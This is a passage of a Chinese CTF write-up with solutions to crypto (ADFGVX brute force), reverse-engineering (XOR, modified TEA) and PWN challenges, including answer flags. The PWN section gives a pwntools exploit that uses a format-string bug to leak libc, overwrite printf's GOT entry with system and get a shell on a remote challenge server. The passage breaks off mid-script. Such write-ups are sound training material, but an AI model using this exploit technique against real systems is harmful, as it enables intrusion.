class=\"built_in\">len</span>(word))]</span><br><span class=\"line\">    t2 = [(k[<span class=\"number\">1</span>], i) <span class=\"keyword\">for</span> i, k <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">sorted</span>(t1))]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [q[<span class=\"number\">1</span>] <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(t2)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encipher_sortind</span>(<span class=\"params\">self,string</span>):</span><br><span class=\"line\">     string = self.remove_punctuation(string)    </span><br><span class=\"line\">     ret = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">     ind = self.sortind(self.keyword)   </span><br><span class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(self.keyword)): </span><br><span class=\"line\">          ret += string[ind.index(i)::<span class=\"built_in\">len</span>(self.keyword)] <span class=\"comment\">#取出某一列拼出来</span></span><br><span class=\"line\">     <span class=\"keyword\">return</span> ret</span><br></pre></td></tr></table></figure></p>\n<p>可以手动测试</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/2dcc4036c7d355c33b91d57185d4293f.png\" alt=\"image-20220608125424031\" /></p>\n<p>这样的话这个 ind 可以被爆破，因为 keyword 长度为 7 那么 ind 的排序为 7*6*5*4*3*2 = 5040 种可能，并且其中移位置换后解密不能出现数字或相同字母，爆破即可，解密脚本如下。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pycipher <span class=\"keyword\">import</span> ADFGVX</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> permutations</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decipher_pair</span>(<span class=\"params\">pair, key=<span class=\"string\">&#x27;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#x27;</span>, size=<span class=\"number\">6</span>, chars=<span class=\"string\">&#x27;ADFGVX&#x27;</span></span>): <span class=\"comment\">#反求key</span></span><br><span class=\"line\">    row = chars.index(pair[<span class=\"number\">0</span>])</span><br><span class=\"line\">    col = chars.index(pair[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> key[row * size + col]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decipher_str</span>(<span class=\"params\">string</span>):</span><br><span class=\"line\">    ret = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(string), <span class=\"number\">2</span>):</span><br><span class=\"line\">        ret += decipher_pair(string[i:i + <span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">s</span>): <span class=\"comment\">#优化爆破 即解密的key要在小写字母表内 且 无数字</span></span><br><span class=\"line\">    num_lst = [<span class=\"string\">&#x27;AF&#x27;</span>, <span class=\"string\">&#x27;AX&#x27;</span>, <span class=\"string\">&#x27;DA&#x27;</span>, <span class=\"string\">&#x27;DV&#x27;</span>, <span class=\"string\">&#x27;FD&#x27;</span>, <span class=\"string\">&#x27;GG&#x27;</span>, <span class=\"string\">&#x27;VD&#x27;</span>, <span class=\"string\">&#x27;VV&#x27;</span>, <span class=\"string\">&#x27;XD&#x27;</span>, <span class=\"string\">&#x27;XX&#x27;</span>] <span class=\"comment\">#剔除数字</span></span><br><span class=\"line\">    <span class=\"built_in\">all</span> = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        t = s[i * <span class=\"number\">2</span>] + s[i * <span class=\"number\">2</span> + <span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t <span class=\"keyword\">in</span> num_lst):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t <span class=\"keyword\">in</span> <span class=\"built_in\">all</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"built_in\">all</span>.append(t)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">kenc = <span class=\"string\">&#x27;XAGDFGVGXXXGAX&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;DXVGGVGGVGVFXAFVFXFFXFVFFFVFDVVGADGVAVGDAAVXGDGXGXDFVFDAVADAXAAFFVFXXGVX&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">r1 = [kenc[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(kenc), <span class=\"number\">2</span>)] <span class=\"comment\">#明文中第一行</span></span><br><span class=\"line\">r2 = [kenc[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">len</span>(kenc), <span class=\"number\">2</span>)] <span class=\"comment\">#明文中第二行</span></span><br><span class=\"line\"></span><br><span class=\"line\">all_list = <span class=\"built_in\">list</span>(permutations([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>], <span class=\"number\">7</span>)) <span class=\"comment\">#暴力枚举所有状态</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> all_list:</span><br><span class=\"line\">    c = [r1[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> it] + [r2[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> it] <span class=\"comment\">#连续两个为r1和r2行中的元素 且置换回去</span></span><br><span class=\"line\">    d = <span class=\"string\">&#x27;&#x27;</span>.join(c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> check(c):</span><br><span class=\"line\">        kd = decipher_str(d)</span><br><span class=\"line\">        enc = ADFGVX(<span class=\"string\">&#x27;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#x27;</span>, kd)</span><br><span class=\"line\">        ed = enc.encipher(kd)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ed == kenc:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(kd,it)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(enc.decipher(flag).lower())</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;fb0dd5203c02cf7c60dc99330b5bfa66&#125;</span></span><br></pre></td></tr></table></figure><br />\nADFGVX 参考链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V1emVuL2FydGljbGUvZGV0YWlscy8xMTkwODUzNTA=\">https://blog.csdn.net/euzen/article/details/119085350</span></p>\n<h2 id=\"re\"><a class=\"anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"re1\"><a class=\"anchor\" href=\"#re1\">#</a> RE1</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/7c2d39d2c6227afa277042cf00152b28.png\" alt=\"image-20220608101847626\" /></p>\n<p>GO 语言逆向题，flag 直接和输入比对，可以在 main_mian 函数的窗口看到 flag，或 string+F12 搜索 flag 即可。</p>\n<p 02f4fd5497119e238350002c5dbe1341=\"\">flag</p>\n<h3 id=\"re2\"><a class=\"anchor\" href=\"#re2\">#</a> RE2</h3>\n<p>首先 shfit+F12 在 strings 窗口看到有关 flag 的明文字符，交叉引用定位 check 函数。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/9b5fe8265403314329b3c674044bb68b.png\" alt=\"image-20220608102221703\" /></p>\n<p>可见被去了符号，可以根据明文信息判断 printf 等系统函数或者结合 IDA 自带的 Lumina 恢复符号 (不过效果不是很明显)。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/da8d38b07b5e7cf03c41a567f48d5153.png\" alt=\"image-20220608102354592\" /></p>\n<p>根据反编译代码结构大致猜测是对输入明文进行了异或处理 (或其他更多操作)，可以结合调试来判断，构造输入为 flag {aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/8f3cf2b4c05deabfe371be3385cfd607.png\" alt=\"image-20220608103006635\" /></p>\n<p>V5 首先指向输入附近，继续单步发现 v9 指向输入字符串的首部指针，V10 指向尾部指针。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/909ed8188b35431bcc1e4bb5116a0d4a.png\" alt=\"image-20220608103326614\" /></p>\n<p>之后通过首位指针来让整个字符串异或 7，并保存 v6 的结构体内 (v6 应该是个结构体，其地址处的第二个指针指向加密后的结果)。最终将加密结果与 &amp; unk_7FF6EFEE78D0 指向的结构体中的密文比对。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/65edca9055c4a728e1d318e7368d47f7.png\" alt=\"image-20220608103527434\" /></p>\n<p>密文在其指向地址的第二个指针。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/a0381cbf6ff1dc1230b451116c3934e0.png\" alt=\"image-20220608103552293\" /></p>\n<p>综上，提取出密文异或即可。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=[<span class=\"number\">0x61</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x7A</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">    s[i]^=<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(s))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;6800b2a681c99eb41780b7b294ac5139&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"re3\"><a class=\"anchor\" href=\"#re3\">#</a> RE3</h3>\n<p>拖入 IDA，观察 main 函数逻辑。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/7f7e210fc34a6bc3fcfb1bb2d1cd4b34.png\" alt=\"image-20220608104456550\" /></p>\n<p>首先是输入 32 位数据存入 buffer，之后无论如何都会进入 LABLE_5 并且将输入 2 个一组作为 16 进制数据存入 v21，并且计算出总字节数的长度 len，对 len 进行 &gt;&gt;3，也就是 8 个一组。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/995c29f2976872b6b957bee05684239a.png\" alt=\"image-20220608105103276\" /></p>\n<p>之后 8 个一组内进行上述加密，根据其结构可以判断出是魔改的 Tea 加密，还原算法如下。</p>\n<p>根据补码运算 v12-0x61c88647 可以看成 v12+0x100000000-0x61c88647 等价于 v12 + 0x9e3779b9。</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Tea_Encrypt</span><span class=\"params\">(ut32* src, ut32* k)</span> &#123;</span><br><span class=\"line\">\tut32 sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tut32 v0 = src[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tut32 v1 = src[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x20</span>; i++) &#123;</span><br><span class=\"line\">\t\tsum += <span class=\"number\">0x9e3779b9</span>;</span><br><span class=\"line\">\t\tv0 += ((v1 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tv1 += ((v0 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">3</span>]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsrc[<span class=\"number\">0</span>] = v0;</span><br><span class=\"line\">\tsrc[<span class=\"number\">1</span>] = v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>魔改点再模数 v1 和 v0 左移三位，并且 key 是 {18,52,86,120}，结合上述条件写出求逆脚本。</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ut32 unsigned int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> delta 0x9E3779B9</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Tea_Decrypt</span><span class=\"params\">(ut32* enc, ut32* k)</span> &#123;</span><br><span class=\"line\">\tut32 sum = delta * <span class=\"number\">0x20</span>;</span><br><span class=\"line\">\tut32 v0 = enc[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tut32 v1 = enc[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x20</span>; i++) &#123;</span><br><span class=\"line\">\t\tv1 -= ((v0 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">3</span>]);</span><br><span class=\"line\">\t\tv0 -= ((v1 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tsum -= delta;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tenc[<span class=\"number\">0</span>] = v0;</span><br><span class=\"line\">\tenc[<span class=\"number\">1</span>] = v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\tut32 m[<span class=\"number\">4</span>] = &#123; <span class=\"number\">0x6278CC2F</span>,<span class=\"number\">0x65FE5089</span> ,<span class=\"number\">0x2B581C7C</span>,<span class=\"number\">0x4E60BA90</span> &#125;;</span><br><span class=\"line\">\tut32 k[<span class=\"number\">4</span>] = &#123; <span class=\"number\">18</span>,<span class=\"number\">52</span>,<span class=\"number\">86</span>,<span class=\"number\">120</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i += <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">\t\tTea_Decrypt(m+i, k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; i++) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%02x&quot;</span>, *((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)m + i));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//flag&#123;35f0be164cf02aa7c59ca09de5d7bb78&#125;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"pmagic\"><a class=\"anchor\" href=\"#pmagic\">#</a> pmagic</h3>\n<p>以下是俩个格式化字符串漏洞的位置。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/a60c1fa88d00bafbe95816ea1a206fbd.png\" alt=\"image-20220608113001740\" /></p>\n<p>第一次运行：</p>\n<ol>\n<li>利用格式化字符串 leak 出 libc 基址。</li>\n<li>利用格式化字符串漏洞同时覆写 printf 的 got 表为 system，同时覆写 _fini_array 为 0x400640 使再次运行。本题有个更简便的方法就是覆写 exit 的 hook 为 one_gadget，大家也可以尝试。</li>\n</ol>\n<p>第二次运行：</p>\n<ol>\n<li>由于只能读入五个字符，直接  <code>cat *</code>  拿 flag。</li>\n</ol>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pmagic&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pmagic&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;101.133.134.12&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sea(<span class=\"string\">&#x27;Give me your name.\\n&#x27;</span>,<span class=\"string\">&#x27;%15$p&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_leak = <span class=\"built_in\">int</span>(rc(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x5f1718</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">og = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">❯ one_gadget libc-2.23.so -l2</span></span><br><span class=\"line\"><span class=\"string\">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  rax == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span 